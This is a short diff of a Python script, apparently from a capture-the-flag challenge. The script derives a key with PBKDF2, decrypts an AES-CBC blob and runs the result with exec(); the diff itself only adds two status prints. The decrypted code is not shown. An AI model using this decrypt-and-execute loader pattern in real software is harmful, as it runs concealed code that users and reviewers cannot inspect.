@@ -20,8 +20,10 @@ ciphertext = encrypted_data[32:]
 key = PBKDF2(thechallenge, salt, dkLen=32, count=100000)
 
 # Decrypt
+print("[+] Decrypting...")
 cipher = AES.new(key, AES.MODE_CBC, iv)
 plaintext = cipher.decrypt(ciphertext).rstrip(b'\0')
 
 # Execute decrypted script
+print("[+] Executing decrypted code!")
 exec(plaintext)
